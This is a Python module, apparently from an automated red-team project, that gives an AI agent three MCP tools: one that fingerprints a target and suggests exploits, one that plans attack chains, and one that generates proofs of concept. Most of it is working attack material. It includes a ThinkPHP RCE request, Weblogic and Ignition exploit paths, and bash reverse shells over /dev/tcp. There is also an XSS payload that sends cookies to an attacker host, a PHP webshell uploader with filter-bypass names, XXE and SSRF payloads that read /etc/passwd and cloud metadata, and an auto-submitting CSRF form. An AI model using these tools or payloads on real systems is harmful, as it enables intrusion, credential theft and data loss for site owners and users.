"""
AI决策工具模块

包含工具:
- smart_exploit_suggest: 智能漏洞利用建议
- attack_chain_plan: 攻击链规划
- poc_generator: PoC模板生成
"""
import logging


def register_ai_tools(mcp):
    """注册AI决策工具到MCP服务器"""

    @mcp.tool()
    def smart_exploit_suggest(target: str) -> dict:
        """智能漏洞利用建议 - 检测技术栈并推荐针对性利用方法"""
        import requests

        result = {
            "target": target,
            "detected_tech": [],
            "cve_matches": [],
            "exploit_suggestions": [],
            "attack_vectors": []
        }

        # 解析目标
        if not target.startswith("http"):
            target = f"https://{target}"

        # 1. 技术栈检测 - 延迟导入避免循环依赖
        from tools.recon_tools import _tech_detect_impl
        tech_result = _tech_detect_impl(target)
        if not tech_result.get("success"):
            return {"success": False, "error": "技术栈检测失败"}

        tech = tech_result.get("technology", {})

        # 收集检测到的技术
        detected = []
        if tech.get("server"):
            detected.append({"type": "server", "name": tech["server"]})
        if tech.get("powered_by"):
            detected.append({"type": "framework", "name": tech["powered_by"]})
        for cms in tech.get("cms", []):
            detected.append({"type": "cms", "name": cms})
        for fw in tech.get("frameworks", []):
            detected.append({"type": "framework", "name": fw})

        result["detected_tech"] = detected

        # 2. 针对每个技术搜索CVE并生成利用建议
        exploit_db = {
            "WordPress": {
                "common_vulns": ["插件漏洞", "主题漏洞", "xmlrpc攻击", "用户枚举"],
                "attack_vectors": [
                    "尝试 /wp-admin 弱口令爆破",
                    "检测 /xmlrpc.php 是否开启",
                    "枚举 /wp-json/wp/v2/users 获取用户名",
                    "扫描已知漏洞插件: contact-form-7, elementor, woocommerce"
                ],
                "tools": ["wpscan", "nuclei -t wordpress"]
            },
            "ThinkPHP": {
                "common_vulns": ["RCE (5.0.x/5.1.x)", "SQL注入", "文件包含"],
                "attack_vectors": [
                    "测试 ThinkPHP 5.x RCE: /index.php?s=/index/\\think\\app/invokefunction",
                    "检测调试模式是否开启",
                    "尝试日志文件泄露"
                ],
                "tools": ["ThinkPHP RCE检测脚本"]
            },
            "Spring": {
                "common_vulns": ["Spring4Shell", "SpEL注入", "Actuator泄露"],
                "attack_vectors": [
                    "检测 /actuator/env 信息泄露",
                    "测试 Spring4Shell (CVE-2022-22965)",
                    "检测 /actuator/heapdump 内存泄露"
                ],
                "tools": ["nuclei -t spring"]
            },
            "Apache": {
                "common_vulns": ["路径遍历", "请求走私", "mod_proxy SSRF"],
                "attack_vectors": [
                    "测试路径遍历: /.%2e/.%2e/etc/passwd",
                    "检测 server-status 信息泄露",
                    "测试 mod_proxy SSRF"
                ],
                "tools": ["nuclei -t apache"]
            },
            "Nginx": {
                "common_vulns": ["配置错误", "路径遍历", "CRLF注入"],
                "attack_vectors": [
                    "测试 alias 路径遍历",
                    "检测 nginx.conf 泄露",
                    "测试 CRLF 注入"
                ],
                "tools": ["gixy", "nuclei -t nginx"]
            },
            "Laravel": {
                "common_vulns": ["调试模式RCE", "反序列化", "SQL注入"],
                "attack_vectors": [
                    "检测 APP_DEBUG=true 调试模式",
                    "测试 /_ignition/execute-solution RCE",
                    "检测 .env 文件泄露"
                ],
                "tools": ["nuclei -t laravel"]
            },
            "Django": {
                "common_vulns": ["调试模式信息泄露", "SQL注入", "SSTI"],
                "attack_vectors": [
                    "检测 DEBUG=True 调试页面",
                    "测试 SSTI: {{7*7}}",
                    "检测 /admin 后台"
                ],
                "tools": ["nuclei -t django"]
            },
            "Tomcat": {
                "common_vulns": ["管理后台弱口令", "文件上传", "AJP漏洞"],
                "attack_vectors": [
                    "尝试 /manager/html 默认凭据 (tomcat:tomcat)",
                    "测试 Ghostcat (CVE-2020-1938)",
                    "检测 /examples 示例应用"
                ],
                "tools": ["nuclei -t tomcat"]
            }
        }

        for tech_item in detected:
            tech_name = tech_item["name"]

            # 搜索相关CVE
            try:
                from tools.cve_tools import register_cve_tools
                # 直接调用CVE搜索逻辑
                cve_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={tech_name}&resultsPerPage=5"
                resp = requests.get(cve_url, timeout=10, headers={"User-Agent": "AutoRedTeam/2.0"})
                if resp.status_code == 200:
                    data = resp.json()
                    for item in data.get("vulnerabilities", [])[:5]:
                        cve = item.get("cve", {})
                        cvss = "N/A"
                        metrics = cve.get("metrics", {})
                        if metrics.get("cvssMetricV31"):
                            cvss = metrics["cvssMetricV31"][0].get("cvssData", {}).get("baseScore", "N/A")

                        desc = ""
                        for d in cve.get("descriptions", []):
                            if d.get("lang") == "en":
                                desc = d.get("value", "")[:100]
                                break

                        result["cve_matches"].append({
                            "tech": tech_name,
                            "cve_id": cve.get("id"),
                            "cvss": cvss,
                            "summary": desc
                        })
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

            # 匹配利用建议
            for key, exploits in exploit_db.items():
                if key.lower() in tech_name.lower():
                    result["exploit_suggestions"].append({
                        "tech": tech_name,
                        "common_vulns": exploits["common_vulns"],
                        "recommended_tools": exploits.get("tools", [])
                    })
                    result["attack_vectors"].extend(exploits["attack_vectors"])

        # 去重攻击向量
        result["attack_vectors"] = list(set(result["attack_vectors"]))

        return {"success": True, "data": result}

    @mcp.tool()
    def attack_chain_plan(
        vulns: list,
        detected_cms: str = None,
        weak_credentials: str = None
    ) -> dict:
        """自动化攻击链规划 - 根据发现的漏洞生成攻击链

        Args:
            vulns: 漏洞列表，如 ["sqli", "xss", "file_upload", "ssrf"]
            detected_cms: 检测到的CMS (逗号分隔)，如 "WordPress,ThinkPHP"
            weak_credentials: 发现的弱凭证JSON，如 '[{"cms":"WordPress","username":"admin","password":"123456"}]'

        融合指纹、凭证、漏洞信息生成更精准的攻击链。
        """
        import json as json_module

        # 解析CMS列表
        cms_list = []
        if detected_cms:
            cms_list = [c.strip() for c in detected_cms.split(',')]

        # 解析弱凭证
        creds_list = []
        if weak_credentials:
            try:
                creds_list = json_module.loads(weak_credentials)
            except json_module.JSONDecodeError:
                pass

        # CMS专项攻击模板
        cms_attack_templates = {
            "WordPress": {
                "phase": "Initial Access",
                "attack_vectors": [
                    {"action": "管理后台登录", "detail": "使用弱口令登录 /wp-admin", "commands": ["访问 /wp-admin", "使用凭证登录"]},
                    {"action": "插件上传", "detail": "上传恶意插件获取Webshell", "commands": ["安装自定义插件", "访问插件文件执行命令"]},
                    {"action": "主题编辑", "detail": "编辑主题文件注入代码", "commands": ["外观→主题编辑器", "修改 404.php 注入代码"]},
                ],
                "post_exploit": ["持久化后门", "数据库导出", "用户信息窃取"]
            },
            "ThinkPHP": {
                "phase": "Initial Access",
                "attack_vectors": [
                    {"action": "RCE漏洞利用", "detail": "ThinkPHP 5.x RCE", "commands": [
                        "/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
                    ]},
                    {"action": "日志文件利用", "detail": "读取日志获取敏感信息", "commands": ["访问 /runtime/log/"]},
                ],
                "post_exploit": ["反弹Shell", "数据库配置提取", "横向移动"]
            },
            "Tomcat": {
                "phase": "Initial Access",
                "attack_vectors": [
                    {"action": "Manager后台", "detail": "使用默认凭证登录Manager", "commands": ["访问 /manager/html", "使用 tomcat:tomcat 登录"]},
                    {"action": "WAR部署", "detail": "上传恶意WAR包", "commands": ["准备 shell.war", "通过Manager部署"]},
                ],
                "post_exploit": ["Webshell访问", "服务器权限获取", "内网渗透"]
            },
            "Spring": {
                "phase": "Initial Access",
                "attack_vectors": [
                    {"action": "Actuator利用", "detail": "敏感端点信息泄露", "commands": ["/actuator/env", "/actuator/heapdump"]},
                    {"action": "Spring4Shell", "detail": "CVE-2022-22965 RCE", "commands": ["构造恶意请求修改日志路径"]},
                ],
                "post_exploit": ["配置提取", "内存dump分析", "凭证获取"]
            },
            "Laravel": {
                "phase": "Initial Access",
                "attack_vectors": [
                    {"action": "调试模式RCE", "detail": "Ignition RCE", "commands": ["/_ignition/execute-solution"]},
                    {"action": ".env泄露", "detail": "获取数据库凭证", "commands": ["访问 /.env 文件"]},
                ],
                "post_exploit": ["数据库访问", "APP_KEY利用", "反序列化攻击"]
            },
            "Weblogic": {
                "phase": "Initial Access",
                "attack_vectors": [
                    {"action": "控制台漏洞", "detail": "CVE-2020-14882 未授权RCE", "commands": [
                        "/console/css/%252e%252e%252fconsole.portal"
                    ]},
                    {"action": "T3协议攻击", "detail": "反序列化漏洞", "commands": ["使用ysoserial生成payload"]},
                ],
                "post_exploit": ["部署Webshell", "域渗透", "数据窃取"]
            },
            "Jenkins": {
                "phase": "Initial Access",
                "attack_vectors": [
                    {"action": "脚本控制台", "detail": "Groovy脚本执行", "commands": ["/script 执行系统命令"]},
                    {"action": "凭证提取", "detail": "获取存储的凭证", "commands": ["访问 /credentials/"]},
                ],
                "post_exploit": ["CI/CD投毒", "代码仓库访问", "供应链攻击"]
            },
        }

        # 攻击链模板
        chain_templates = {
            "sqli": {
                "phase": "Initial Access",
                "next_steps": [
                    {"action": "数据提取", "detail": "使用UNION注入提取数据库信息", "commands": ["sqlmap -u URL --dbs", "sqlmap -u URL -D db --tables"]},
                    {"action": "权限提升", "detail": "尝试读取敏感文件或执行命令", "commands": ["sqlmap -u URL --file-read=/etc/passwd", "sqlmap -u URL --os-shell"]},
                    {"action": "横向移动", "detail": "获取数据库凭据后尝试登录其他服务", "commands": ["使用获取的凭据尝试SSH/RDP"]}
                ],
                "post_exploit": ["提取用户凭据", "查找配置文件", "数据库备份"]
            },
            "xss": {
                "phase": "Initial Access",
                "next_steps": [
                    {"action": "会话劫持", "detail": "窃取管理员Cookie", "commands": ["<script>new Image().src='http://attacker/steal?c='+document.cookie</script>"]},
                    {"action": "钓鱼攻击", "detail": "注入虚假登录表单", "commands": ["注入伪造的登录框获取凭据"]},
                    {"action": "键盘记录", "detail": "注入键盘记录脚本", "commands": ["注入keylogger.js"]}
                ],
                "post_exploit": ["获取管理员权限", "进一步渗透内网"]
            },
            "file_upload": {
                "phase": "Initial Access",
                "next_steps": [
                    {"action": "Webshell上传", "detail": "上传PHP/JSP/ASP木马", "commands": ["上传 shell.php", "访问 /uploads/shell.php?cmd=id"]},
                    {"action": "反弹Shell", "detail": "获取交互式Shell", "commands": ["nc -lvp 4444", "bash -i >& /dev/tcp/IP/4444 0>&1"]},
                    {"action": "权限提升", "detail": "本地提权", "commands": ["sudo -l", "find / -perm -4000 2>/dev/null"]}
                ],
                "post_exploit": ["持久化后门", "内网扫描", "数据窃取"]
            },
            "ssrf": {
                "phase": "Initial Access",
                "next_steps": [
                    {"action": "内网探测", "detail": "扫描内网服务", "commands": ["探测 http://127.0.0.1:22", "探测 http://192.168.1.1"]},
                    {"action": "云元数据", "detail": "获取云服务凭据", "commands": ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/"]},
                    {"action": "服务攻击", "detail": "攻击内网Redis/MySQL等", "commands": ["gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall"]}
                ],
                "post_exploit": ["获取云凭据", "攻击内网服务", "横向移动"]
            },
            "cmd_inject": {
                "phase": "Initial Access",
                "next_steps": [
                    {"action": "反弹Shell", "detail": "获取交互式访问", "commands": ["bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"]},
                    {"action": "信息收集", "detail": "收集系统信息", "commands": ["id; uname -a; cat /etc/passwd"]},
                    {"action": "权限提升", "detail": "本地提权", "commands": ["sudo -l", "cat /etc/crontab"]}
                ],
                "post_exploit": ["持久化", "横向移动", "数据窃取"]
            },
            "xxe": {
                "phase": "Initial Access",
                "next_steps": [
                    {"action": "文件读取", "detail": "读取敏感文件", "commands": ["<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"]},
                    {"action": "SSRF", "detail": "探测内网", "commands": ["<!ENTITY xxe SYSTEM 'http://internal-server/'>"]},
                    {"action": "DoS", "detail": "Billion Laughs攻击", "commands": ["递归实体定义"]}
                ],
                "post_exploit": ["获取配置文件", "内网渗透"]
            },
            "idor": {
                "phase": "Privilege Escalation",
                "next_steps": [
                    {"action": "数据泄露", "detail": "遍历获取其他用户数据", "commands": ["修改id参数: ?id=1, ?id=2, ..."]},
                    {"action": "权限提升", "detail": "访问管理员资源", "commands": ["尝试访问 ?role=admin, ?user_id=1"]},
                    {"action": "账户接管", "detail": "修改其他用户信息", "commands": ["PUT /api/user/1 修改密码"]}
                ],
                "post_exploit": ["批量数据提取", "账户接管"]
            },
            "auth_bypass": {
                "phase": "Initial Access",
                "next_steps": [
                    {"action": "管理后台访问", "detail": "直接访问管理功能", "commands": ["访问绕过后的管理页面"]},
                    {"action": "功能滥用", "detail": "执行管理操作", "commands": ["创建管理员账户", "修改系统配置"]},
                    {"action": "数据访问", "detail": "访问敏感数据", "commands": ["导出用户数据", "查看系统日志"]}
                ],
                "post_exploit": ["创建后门账户", "持久化访问"]
            }
        }

        attack_chain = {
            "vulns_input": vulns,
            "attack_phases": [],
            "recommended_sequence": [],
            "post_exploit_goals": []
        }

        # 根据漏洞生成攻击链
        for vuln in vulns:
            vuln_lower = vuln.lower().replace(" ", "_").replace("-", "_")
            for key, template in chain_templates.items():
                if key in vuln_lower or vuln_lower in key:
                    attack_chain["attack_phases"].append({
                        "vulnerability": vuln,
                        "phase": template["phase"],
                        "next_steps": template["next_steps"],
                        "post_exploit": template["post_exploit"]
                    })
                    attack_chain["post_exploit_goals"].extend(template["post_exploit"])
                    break

        # ===== 基于 CMS 指纹生成攻击阶段 =====
        for cms in cms_list:
            for cms_key, cms_template in cms_attack_templates.items():
                if cms_key.lower() in cms.lower() or cms.lower() in cms_key.lower():
                    # 添加 CMS 专项攻击阶段
                    attack_chain["attack_phases"].append({
                        "source": "cms_fingerprint",
                        "cms": cms,
                        "phase": cms_template["phase"],
                        "attack_vectors": cms_template["attack_vectors"],
                        "post_exploit": cms_template["post_exploit"]
                    })
                    attack_chain["post_exploit_goals"].extend(cms_template["post_exploit"])

                    # 为每个攻击向量添加推荐步骤
                    for vector in cms_template["attack_vectors"]:
                        attack_chain["recommended_sequence"].append({
                            "step": len(attack_chain["recommended_sequence"]) + 1,
                            "source": "cms",
                            "cms": cms,
                            "phase": cms_template["phase"],
                            "action": vector["action"],
                            "detail": vector["detail"],
                            "commands": vector.get("commands", [])
                        })
                    break

        # ===== 基于弱凭证生成直接利用路径 =====
        for cred in creds_list:
            cred_cms = cred.get("cms", "Unknown")
            username = cred.get("username", "")
            password = cred.get("password", "")
            endpoint = cred.get("url", cred.get("endpoint", ""))

            # 添加凭证利用攻击阶段
            attack_chain["attack_phases"].append({
                "source": "weak_credential",
                "cms": cred_cms,
                "phase": "Initial Access",
                "credential": {"username": username, "password": "***"},  # 隐藏密码
                "next_steps": [
                    {
                        "action": f"使用弱凭证登录 {cred_cms}",
                        "detail": f"用户名: {username}, 端点: {endpoint}",
                        "commands": [f"访问 {endpoint}", f"使用凭证 {username}:*** 登录"]
                    }
                ],
                "post_exploit": [f"{cred_cms} 后台访问", "配置修改", "数据导出"]
            })

            # 添加直接利用路径到推荐序列（优先级最高）
            attack_chain["recommended_sequence"].insert(0, {
                "step": 0,  # 稍后重新编号
                "source": "credential",
                "cms": cred_cms,
                "phase": "Initial Access",
                "action": f"弱凭证登录 {cred_cms}",
                "detail": f"已发现有效凭证: {username}@{endpoint}",
                "priority": "HIGH"
            })

            # 根据 CMS 类型添加后续利用建议
            if cred_cms in cms_attack_templates:
                post_actions = cms_attack_templates[cred_cms].get("post_exploit", [])
                attack_chain["post_exploit_goals"].extend(post_actions)

        # 重新编号推荐序列
        for i, seq in enumerate(attack_chain["recommended_sequence"]):
            seq["step"] = i + 1

        # 生成推荐攻击序列
        phase_order = ["Initial Access", "Execution", "Privilege Escalation", "Lateral Movement", "Data Exfiltration"]
        for phase in phase_order:
            for ap in attack_chain["attack_phases"]:
                if ap["phase"] == phase:
                    attack_chain["recommended_sequence"].append({
                        "step": len(attack_chain["recommended_sequence"]) + 1,
                        "vuln": ap["vulnerability"],
                        "phase": phase,
                        "action": ap["next_steps"][0]["action"] if ap["next_steps"] else "利用漏洞"
                    })

        # 去重
        attack_chain["post_exploit_goals"] = list(set(attack_chain["post_exploit_goals"]))

        return {"success": True, "attack_chain": attack_chain}

    @mcp.tool()
    def poc_generator(vuln_type: str, target: str = "TARGET", param: str = "PARAM") -> dict:
        """PoC模板生成 - 根据漏洞类型生成基础PoC代码框架

        Args:
            vuln_type: 漏洞类型 (sqli/xss/ssrf/xxe/cmd_inject/file_upload/idor/csrf)
            target: 目标URL
            param: 漏洞参数
        """
        poc_templates = {
            "sqli": {
                "name": "SQL Injection PoC",
                "python": f'''#!/usr/bin/env python3
"""SQL Injection PoC"""
import requests

TARGET = "{target}"
PARAM = "{param}"

# 测试payload
payloads = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "' AND SLEEP(5)--"
]

for payload in payloads:
    url = f"{{TARGET}}?{{PARAM}}={{payload}}"
    try:
        resp = requests.get(url, timeout=10)
        print(f"[*] Testing: {{payload[:30]}}...")
        print(f"    Status: {{resp.status_code}}, Length: {{len(resp.text)}}")
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
                "curl": f'curl "{target}?{param}=\' OR \'1\'=\'1"'
            },
            "xss": {
                "name": "XSS PoC",
                "python": f'''#!/usr/bin/env python3
"""XSS PoC"""
import requests
from urllib.parse import quote

TARGET = "{target}"
PARAM = "{param}"

payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)</script>"
]

for payload in payloads:
    url = f"{{TARGET}}?{{PARAM}}={{quote(payload)}}"
    try:
        resp = requests.get(url, timeout=10)
        if payload in resp.text:
            print(f"[+] XSS Found! Payload reflected: {{payload}}")
        else:
            print(f"[-] Payload not reflected: {{payload[:30]}}")
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
                "curl": f'curl "{target}?{param}=<script>alert(1)</script>"'
            },
            "ssrf": {
                "name": "SSRF PoC",
                "python": f'''#!/usr/bin/env python3
"""SSRF PoC"""
import requests
from urllib.parse import quote

TARGET = "{target}"
PARAM = "{param}"

# 内网探测目标
internal_targets = [
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd"
]

for internal in internal_targets:
    url = f"{{TARGET}}?{{PARAM}}={{quote(internal)}}"
    try:
        resp = requests.get(url, timeout=10)
        print(f"[*] Testing: {{internal}}")
        print(f"    Status: {{resp.status_code}}, Length: {{len(resp.text)}}")
        if "root:" in resp.text or "ami-id" in resp.text:
            print(f"[+] SSRF Confirmed!")
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
                "curl": f'curl "{target}?{param}=http://127.0.0.1:22"'
            },
            "xxe": {
                "name": "XXE PoC",
                "python": f'''#!/usr/bin/env python3
"""XXE PoC"""
import requests

TARGET = "{target}"

# XXE Payload
payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""

headers = {{"Content-Type": "application/xml"}}

try:
    resp = requests.post(TARGET, data=payload, headers=headers, timeout=10)
    print(f"[*] Response Status: {{resp.status_code}}")
    if "root:" in resp.text:
        print("[+] XXE Confirmed! File content leaked")
        print(resp.text[:500])
    else:
        print("[-] XXE not confirmed")
except Exception as e:
    print(f"[-] Error: {{e}}")
''',
                "curl": '''curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' "TARGET"'''
            },
            "cmd_inject": {
                "name": "Command Injection PoC",
                "python": f'''#!/usr/bin/env python3
"""Command Injection PoC"""
import requests
from urllib.parse import quote

TARGET = "{target}"
PARAM = "{param}"

payloads = [
    "; id",
    "| id",
    "$(id)",
    "`id`",
    "| cat /etc/passwd"
]

for payload in payloads:
    url = f"{{TARGET}}?{{PARAM}}={{quote(payload)}}"
    try:
        resp = requests.get(url, timeout=10)
        print(f"[*] Testing: {{payload}}")
        if "uid=" in resp.text or "root:" in resp.text:
            print(f"[+] Command Injection Confirmed!")
            print(resp.text[:300])
            break
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
                "curl": f'curl "{target}?{param}=;id"'
            },
            "file_upload": {
                "name": "File Upload PoC",
                "python": f'''#!/usr/bin/env python3
"""File Upload PoC"""
import requests

TARGET = "{target}"  # 上传接口URL

# PHP Webshell
shell_content = b"<?php system($_GET['cmd']); ?>"

# 测试不同文件名绕过
test_files = [
    ("shell.php", shell_content, "application/x-php"),
    ("shell.php.jpg", shell_content, "image/jpeg"),
    ("shell.phtml", shell_content, "text/html"),
    ("shell.php%00.jpg", shell_content, "image/jpeg"),
]

for filename, content, mime in test_files:
    files = {{"file": (filename, content, mime)}}
    try:
        resp = requests.post(TARGET, files=files, timeout=10)
        print(f"[*] Uploading: {{filename}}")
        print(f"    Status: {{resp.status_code}}")
        if resp.status_code == 200:
            print(f"[+] Upload may have succeeded!")
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
                "curl": 'curl -F "file=@shell.php;type=image/jpeg" "TARGET"'
            },
            "idor": {
                "name": "IDOR PoC",
                "python": f'''#!/usr/bin/env python3
"""IDOR PoC"""
import requests

TARGET = "{target}"
PARAM = "{param}"

# 测试ID遍历
test_ids = [1, 2, 3, 100, 1000, 0, -1]

results = []
for test_id in test_ids:
    url = f"{{TARGET}}?{{PARAM}}={{test_id}}"
    try:
        resp = requests.get(url, timeout=10)
        results.append({{
            "id": test_id,
            "status": resp.status_code,
            "length": len(resp.text)
        }})
        print(f"[*] ID={{test_id}}: Status={{resp.status_code}}, Length={{len(resp.text)}}")
    except Exception as e:
        print(f"[-] Error: {{e}}")

# 分析结果
lengths = [r["length"] for r in results if r["status"] == 200]
if len(set(lengths)) > 1:
    print("[+] Potential IDOR: Different IDs return different content!")
''',
                "curl": f'for i in 1 2 3 100; do curl "{target}?{param}=$i"; done'
            },
            "csrf": {
                "name": "CSRF PoC",
                "html": f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<h1>CSRF PoC</h1>
<form id="csrf_form" action="{target}" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="password" value="hacked123">
</form>
<script>document.getElementById('csrf_form').submit();</script>
</body>
</html>''',
                "note": "将此HTML托管在攻击者服务器，诱导受害者访问"
            }
        }

        vuln_lower = vuln_type.lower().replace(" ", "_").replace("-", "_")

        for key, template in poc_templates.items():
            if key in vuln_lower or vuln_lower in key:
                return {
                    "success": True,
                    "vuln_type": vuln_type,
                    "poc_name": template["name"],
                    "poc_code": template
                }

        return {
            "success": False,
            "error": f"不支持的漏洞类型: {vuln_type}",
            "supported_types": list(poc_templates.keys())
        }

    return ["smart_exploit_suggest", "attack_chain_plan", "poc_generator"]
